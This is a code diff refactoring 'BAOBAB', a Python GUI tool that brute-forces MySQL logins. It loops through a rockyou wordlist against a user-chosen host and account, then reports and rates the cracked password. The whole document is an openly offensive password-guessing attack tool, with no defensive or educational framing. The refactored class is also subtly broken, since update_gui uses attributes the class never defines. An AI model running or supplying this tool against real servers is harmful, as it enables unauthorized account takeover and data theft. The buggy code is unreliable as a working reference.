@@ -6,104 +6,134 @@ import re
 import time
 import logging
 
-# Global variables for GUI elements
-output_area = None
-progress_bar = None
-
-# Setup logging
+# Setup du logging pour les erreurs
 logging.basicConfig(filename='baobab_errors.log', level=logging.ERROR, format='%(asctime)s %(levelname)s: %(message)s')
 
-# ANSI color codes for console (unused in GUI, kept for potential CLI usage)
-class Colors:
-    OKCYAN = '\033[96m'
-    OKGREEN = '\033[92m'
-    WARNING = '\033[93m'
-    FAIL = '\033[91m'
-    ENDC = '\033[0m'
-
-# Function to classify password complexity
+# Fonction pour classifier la complexité d'un mot de passe
 def classify_password(password):
-    if re.match(r"^(?=.*[0-9])(?=.*[!@#$%^&*])[a-zA-Z0-9!@#$%^&*]{2,}$", password):
+    if re.match(r"^(?=.*[0-9])(?=.*[!?@#$%^&*])[a-zA-Z0-9!?@#$%^&*]{2,}$", password):
         return "[High]"
     elif re.match(r"^(?=.*[0-9])[a-zA-Z0-9]{2,}$", password):
         return "[Medium]"
     else:
         return "[Low]"
 
-# Function to attempt MySQL login
-def brute_force_mysql(host, user, wordlist_path, output_label, delay=0):
-    global output_area, progress_bar
-    try:
-        with open(wordlist_path, 'r', encoding='utf-8') as file:
-            total_lines = sum(1 for line in file)
-            file.seek(0)
-            for index, password in enumerate(file, start=1):
+class BruteForceSQL:
+    def __init__(self, host, user, wordlist_path, output_label):
+        self.host = host
+        self.user = user
+        self.wordlist_path = wordlist_path
+        self.output_label = output_label
+        self.thread = None
+        self.stop_thread = False
+
+    def start(self):
+        self.thread = threading.Thread(target=self.brute_force)
+        self.thread.start()
+
+    def stop(self):
+        self.stop_thread = True
+        if self.thread is not None:
+            self.thread.join()
+
+    def brute_force(self):
+        try:
+            with open(self.wordlist_path, 'r', encoding='utf-8') as file:
+                passwords = file.readlines()
+            total_lines = len(passwords)
+
+            for index, password in enumerate(passwords, start=1):
+                if self.stop_thread:
+                    break
                 password = password.strip()
-                output_area.insert('end', f"Attempt {index}/{total_lines}: {password}\n")
-                output_area.see('end')  # Auto-scroll to the latest entry
-                # Update progress bar
-                progress = (index / total_lines) * 100
-                progress_bar.set(progress)
-                output_label.configure(text=f"Current attempt: {password}")
+
+                progress =  (index / total_lines) * 100
+                self.update_gui(f"Attempt {index}/{total_lines}: {password}", progress)
+
                 try:
-                    connection = mysql.connector.connect(host=host, user=user, password=password)
+                    connection =  mysql.connector.connect(host=self.host, user=self.user, password=password)
                     if connection.is_connected():
                         connection.close()
-                        output_label.configure(text=f"Password found: {password}, Complexity: {classify_password(password)}")
+                        self.update_gui(f"Password found: {password}, Complexity: {classify_password(password)}", 100)
                         return
                 except mysql.connector.Error as e:
                     logging.error(f"MySQL error: {e}")
-                    time.sleep(delay)
-    except FileNotFoundError:
-        output_label.configure(text="Wordlist file not found.")
-        logging.error("Wordlist file not found.")
-    except Exception as e:
-        output_label.configure(text=f"Unexpected error: {e}")
-        output_area.insert('end', f"Error: {e}\n")
-        output_area.see('end')
-        logging.error(f"Unexpected error: {e}")
+                    time.sleep(1)
+        except FileNotFoundError:
+            self.update_gui("Wordlist file not found.", 0)
+            logging.error("Wordlist file not found.")
+        except Exception as e:
+            self.update_gui(f"Unexpected error: {e}", 0)
+            logging.error(f"Unexpected error: {e}")
 
-# GUI Setup
-def setup_gui():
-    global output_area, progress_bar
-    window = ctk.CTk()
-    window.title("BAOBAB : Best And Overpowered Beating Ass Brute-force")
+    def update_gui(self, message, progress):
+        if self.output_label:
+            self.output_label.configure(text=message)
+        if self.output_area:
+            self.output_area.insert('end', f"{message}\n")
+            self.output_area.see('end')
+        if self.progress_bar:
+            self.progress_bar.set(progress)
+    
+class BruteForceGUI:
+    def __init__(self):
+        self.window = ctk.CTk()
+        self.window.title("BAOBAB : Best And Overpowered Beating Ass Brute-force")
+        self.setup_widgets()
+        self.brute_force_instance = None
+    
+    def setup_widgets(self):
+        #Input de l'hôte
+        ctk.CTkLabel(self.window, text="MySQL Host:").pack(pady=10, padx=0)
+        self.host_input = ctk.CTkEntry(self.window)
+        self.host_input.pack(pady=0, padx=10)
+    
+        # Input de l'utilisateur
+        ctk.CTkLabel(self.window, text="MySQL User:").pack(pady=10, padx=0)
+        self.user_input = ctk.CTkEntry(self.window)
+        self.user_input.pack(pady=0, padx=10)
 
-    # Host input
-    ctk.CTkLabel(window, text="MySQL Host:").pack(pady=10, padx=0)
-    host_input = ctk.CTkEntry(window)
-    host_input.pack(pady=0, padx=10)
+        #Input pour la wordlist
+        ctk.CTkLabel(self.window, text="Path to rockyou.txt:").pack(pady=10, padx=0)
+        wordlist_frame = ctk.CTkFrame(self.window)
+        wordlist_frame.pack(pady=0, padx=50)
+        self.wordlist_input = ctk.CTkEntry(wordlist_frame)
+        self.wordlist_input.pack(side='left', fill='x', expand=True)
+        ctk.CTkButton(wordlist_frame, text="Browse", command=self.browse_file).pack(side='right')
 
-    # User input
-    ctk.CTkLabel(window, text="MySQL User:").pack(pady=10, padx=0)
-    user_input = ctk.CTkEntry(window)
-    user_input.pack(pady=0, padx=10)
+        # Zone de texte scrollable pour le logging détaillé
+        self.output_area = scrolledtext.ScrolledText(self.window, height=10, padx=10, pady=10)
+        self.output_area.pack(pady=50)
 
-    # Wordlist path input
-    ctk.CTkLabel(window, text="Path to rockyou.txt:").pack(pady=10, padx=0)
-    wordlist_frame = ctk.CTkFrame(window)
-    wordlist_frame.pack(pady=0, padx=50)
-    wordlist_input = ctk.CTkEntry(wordlist_frame)
-    wordlist_input.pack(side='left', fill='x', expand=True)
-    ctk.CTkButton(wordlist_frame, text="Browse", command=lambda: wordlist_input.insert(0, filedialog.askopenfilename())).pack(side='right')
+        # Barre de progression
+        self.progress_bar = ctk.CTkProgressBar(self.window)
+        self.progress_bar.pack(pady=10)
 
-    # Scrolled Text Area for detailed logging
-    output_area = scrolledtext.ScrolledText(window, height=10, padx=10, pady=10)
-    output_area.pack(pady=50)
+        # Label de l'output
+        self.output_label = ctk.CTkLabel(self.window, text="Ready")
+        self.output_label.pack(pady=10)
 
-    # Progress Bar
-    progress_bar = ctk.CTkProgressBar(window)
-    progress_bar.pack(pady=10)
+        # Bouton pour démarrer / arrêter le bruteforce
+        self.start_button = ctk.CTkButton(self.window, text="Start Brute-Force", command=self.start_brute_force)
+        self.start_button.pack(pady=10)
 
-    # Output label
-    output_label = ctk.CTkLabel(window, text="Ready")
-    output_label.pack(pady=10)
+        self.stop_button = ctk.CTkButton(self.window, text="Stop Brute-Force", command=self.stop_brute_force)
+        self.stop_button.pack(pady=10)
 
-    # Start button
-    start_button = ctk.CTkButton(window, text="Start Brute-Force", command=lambda: threading.Thread(target=brute_force_mysql, args=(host_input.get(), user_input.get(), wordlist_input.get(), output_label)).start())
-    start_button.pack(pady=10)
+    def browse_file(self):
+        self.wordlist_input.delete(0, 'end')
+        self.wordlist_input.insert(0, filedialog.askopenfilename())
+        
+    def start_brute_force(self):
+        self.brute_force_instance = BruteForceSQL(self.host_input.get(), self.user_input.get(), self.wordlist_input.get(), self.output_label)
+        self.brute_force_instance.start()
 
-    window.mainloop()
+    def stop_brute_force(self):
+        if self.brute_force_instance:
+            self.brute_force_instance.stop()
+        
+    def run(self):
+        self.window.mainloop()
 
-# Run the GUI
-setup_gui()
+# Démarrage de l'interface graphique
+BruteForceGUI().run()
